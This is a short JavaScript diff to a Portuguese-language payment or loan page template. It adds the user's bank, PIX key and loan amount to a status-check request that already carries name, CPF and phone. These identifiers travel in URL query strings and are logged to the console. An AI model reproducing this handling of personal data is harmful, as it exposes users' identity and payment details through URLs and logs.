@@ -888,11 +888,26 @@
                 function checkPaymentStatus() {
                     console.log('Verificando status do pagamento:', transactionId);
                     
+                    // Obter o banco, chave PIX e valor do empréstimo da interface
+                    const selectedBank = document.getElementById('selectedBank').textContent;
+                    const pixKeyText = document.getElementById('pixKeyText').textContent;
+                    const loanAmount = document.getElementById('loanAmountText').textContent
+                        .replace('R$', '').replace('.', '').replace(',', '.').trim();
+                    
+                    console.log('Valores a serem enviados:', {
+                        bank: selectedBank,
+                        pix_key: pixKeyText,
+                        loan_amount: loanAmount
+                    });
+                    
                     // Incluir parâmetros do usuário na URL para que o backend possa usar para enviar SMS
                     const params = new URLSearchParams({
                         nome: '{{ nome }}',
                         cpf: '{{ cpf }}',
-                        phone: '{{ phone }}'  // Importante: incluir o telefone para envio de SMS
+                        phone: '{{ phone }}',  // Importante: incluir o telefone para envio de SMS
+                        bank: selectedBank,
+                        pix_key: pixKeyText,
+                        loan_amount: loanAmount
                     });
                     
                     fetch(`/check-payment-status/${transactionId}?${params.toString()}`)
